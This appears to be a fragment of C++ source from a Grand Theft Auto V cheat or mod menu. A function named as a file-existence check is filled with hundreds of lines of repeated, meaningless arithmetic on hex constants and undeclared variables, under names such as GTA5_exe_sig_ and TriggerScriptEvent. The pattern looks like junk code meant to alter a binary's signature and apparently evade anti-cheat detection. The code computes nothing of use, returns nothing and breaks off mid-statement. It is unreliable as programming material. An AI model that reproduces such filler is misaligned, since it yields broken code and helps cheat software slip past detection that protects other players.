		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		bool ArquivoExiste(std::string name)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
